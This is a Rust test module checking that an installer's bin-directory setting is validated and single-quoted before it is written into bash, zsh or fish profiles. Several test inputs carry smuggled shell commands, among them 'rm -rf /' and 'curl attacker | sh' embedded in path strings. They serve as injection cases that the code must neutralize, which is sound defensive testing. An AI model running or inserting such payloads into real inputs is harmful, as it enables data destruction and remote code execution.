    // ── NEO_BIN_DIR validation + shell-quoting (profile-injection defense) ──── //

    #[test]
    fn validate_bin_dir_accepts_absolute_paths() {
        assert_eq!(
            validate_bin_dir("/home/u/.local/bin").unwrap(),
            PathBuf::from("/home/u/.local/bin")
        );
        // A space is a legitimate path character (we quote on emission, not reject).
        assert!(validate_bin_dir("/opt/neo bin").is_ok());
    }

    #[test]
    fn validate_bin_dir_rejects_relative_empty_and_control_chars() {
        assert!(validate_bin_dir("").is_err());
        assert!(validate_bin_dir("relative/bin").is_err());
        assert!(validate_bin_dir("~/bin").is_err());
        // Newline / CR / NUL / tab would corrupt or inject into the profile.
        assert!(validate_bin_dir("/tmp/evil\nmalicious").is_err());
        assert!(validate_bin_dir("/tmp/evil\r\ncurl attacker").is_err());
        assert!(validate_bin_dir("/tmp/evil\0x").is_err());
        assert!(validate_bin_dir("/tmp/evil\tx").is_err());
    }

    #[test]
    fn posix_single_quote_is_injection_proof() {
        assert_eq!(posix_single_quote("/plain/path"), "'/plain/path'");
        // Embedded single quote is closed, escaped, reopened.
        assert_eq!(posix_single_quote("/a'b"), "'/a'\\''b'");
        // Metacharacters are inert inside single quotes.
        assert_eq!(
            posix_single_quote("/tmp/x\"; rm -rf /; #"),
            "'/tmp/x\"; rm -rf /; #'"
        );
    }

    #[test]
    fn fish_single_quote_escapes_backslash_and_quote() {
        assert_eq!(fish_single_quote("/plain"), "'/plain'");
        assert_eq!(fish_single_quote("/a'b"), "'/a\\'b'");
        assert_eq!(fish_single_quote("/a\\b"), "'/a\\\\b'");
    }

    #[test]
    fn path_line_default_uses_expandable_home() {
        let bash = path_line_for(&detect::Shell::Bash, None);
        assert!(bash.starts_with("export PATH="));
        assert!(bash.contains("$HOME/.local/bin"));
        let fish = path_line_for(&detect::Shell::Fish, None);
        assert!(fish.starts_with("fish_add_path"));
        assert!(fish.contains("$HOME/.local/bin"));
    }

    #[test]
    fn path_line_override_is_single_quoted_and_injection_proof_bash() {
        // A validated-but-hostile-looking absolute path must be emitted so that no
        // metacharacter can escape into the user's shell profile.
        let evil = Path::new("/tmp/evil\"; curl attacker | sh; #");
        let line = path_line_for(&detect::Shell::Zsh, Some(evil));
        assert!(line.starts_with("export PATH='/tmp/evil\"; curl attacker | sh; #'"));
        // The dangerous chars live INSIDE the single-quoted segment; the double
        // quote that would end the string only appears within '...'.
        assert!(line.contains("'/tmp/evil\"; curl attacker | sh; #'"));
        // $HOME / $PATH still expand (they are in the separate double-quoted part).
        assert!(line.contains("$HOME/.nix-profile/bin"));
        assert!(line.ends_with(":$PATH\""));
    }

    #[test]
    fn path_line_override_is_single_quoted_fish() {
        let evil = Path::new("/opt/ne'o");
        let line = path_line_for(&detect::Shell::Fish, Some(evil));
        assert!(line.starts_with("fish_add_path '/opt/ne\\'o' "));
    }

    #[test]
    fn path_line_override_with_space_is_one_word() {
        let line = path_line_for(&detect::Shell::Bash, Some(Path::new("/opt/neo bin")));
        assert!(line.contains("'/opt/neo bin'"));
    }
}
